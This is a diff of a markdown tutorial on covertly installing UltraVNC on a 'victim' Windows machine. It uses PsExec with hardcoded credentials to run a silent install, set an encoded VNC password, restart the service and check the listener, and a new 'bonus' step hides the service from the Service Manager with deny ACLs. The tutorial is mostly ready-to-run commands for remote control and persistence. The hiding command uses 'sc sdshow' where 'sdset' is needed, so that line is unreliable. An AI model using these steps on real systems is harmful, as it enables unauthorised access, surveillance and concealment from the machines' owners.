@@ -10,40 +10,32 @@ You can remotely view, control or transfer files the victim computer using the U
 
 ### Step 1: Download UltraVNC setup
 
-Copy current version of ultravnc from the website to your computer as **"c:\\uvncsetup.exe"**.
+Download ultravnc to your computer as **"c:\\uvncsetup.exe"**.
 
 ### Step 2: Start installation 
 
-To start silent installation on victim computer run **"uvncsetup.exe"** as remotely using **PsExec.exe** below. The command copy the specified executable (uvncsetup.exe) to the remote system for execution:
+To silently install ultravnc on victim computer run **"uvncsetup.exe"** as remotely using **PsExec.exe**. Below command runs executable (uvncsetup.exe) on the remote system:
 
 `psexec \\victim -u Default -p admin0 -h -i -c C:\uvncsetup.exe /SP- /VERYSILENT /SUPPRESSMSGBOXES /NOCANCEL /NORESTART /CLOSEAPPLICATIONS /FORCECLOSEAPPLICATIONS /LOGCLOSEAPPLICATIONS /RESTARTAPPLICATIONS /NOICONS /FIREWALL /NOVIEW /COMPONENTS="ultravnc_server" /TASKS="installservice,stopservice" /DIR="%programfiles%\uvnc"`
 
-The inno setup parameters above allow the installation to complete silently. The installation files will be saved in the **"%program files%\uvnc"** directory on victim computer.
+Note: The inno setup parameters above allow the installation to complete silently. The installation files will be saved in the **"%program files%\uvnc"** directory on victim computer.
 
-### Step 3: Define new password 
 
-Create the **ultravnc.ini** file with the password defined in the **"%programfiles%\uvnc"** of the victim computer. 
-UltraVNC password is "**admin0**" defined in **ultravnc.ini**. The ini file content is below:
 
-> [ultravnc] \
-> passwd=56B6ACA18D1BA76008 \
-> passwd2=56B6ACA18D1BA76008
+### Step 3: Set ultravnc password
 
-Copy the file to **"%programfiles%\uvnc"** folder on victim computer.
+To define new ultravnc password and restart ultravnc_service on victim first open an interactive shell to victim computer.
 
-### Step 4: Restart the service
+`psexec \\victim -u Default -p admin0 -h -s -i cmd.exe`
 
-Start the service for the password to take effect. To restart the service open an interactive remote shell to victim computer below:
+And runs commands below. First command creates **ultravnc.ini** file with the password 'admin0' at  **"%programfiles%\uvnc"** on victim computer. Second command restart the ultra vnc service to take affect new password.
 
-`psexec \\victim -u Default -p admin0 -h -i cmd.exe`
-
-And run below command over remote shell:
-
+`(echo [ultravnc] & echo passwd=56B6ACA18D1BA76008 & echo passwd2=56B6ACA18D1BA76008) > "%programfiles%\uvnc\ultravnc.ini"`
 `net start uvnc_service`
 
 ### Step 5: Check the installation
 
-Check UltraVNC listen port with netstat 
+If you want to check UltraVNC listen port and running process:
 
 `netstat -ano | find "5900"`\
 `tasklist /fi "pid eq <pid>"`
@@ -51,3 +43,14 @@ Check UltraVNC listen port with netstat
 Run UltraVNC viewer and connect to victim computer. You can control it with mouse/keyboard or download/upload files via UltraVNC's  file manager.
 
 ![UltraVNC Viewer](assets/uvnc_viewer.png "UltraVNC Viewer")
+
+### Bonus Step: Hide UltraVNC
+
+To hide the service uvnc_service from Service Manager GUI run below:
+
+`sc sdshow uvnc_service "D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)"`
+
+To show it again run below:
+
+`sc sdset uvnc_service "D:(A;;CC;;;AU)(A;;CCLCRPRC;;;IU)(A;;CCLCRPRC;;;SU)(A;;CCLCRPWPRC;;;SY)(A;;KA;;;BA)(A;;CC;;;AC)(A;;CC;;;S-1-15-3-1024-528118966-3876874398-709513571-1907873084-3598227634-3698730060-278077788-3990600205)S:(AU;FA;KA;;;WD)(AU;OIIOFA;GA;;;WD)"`
+
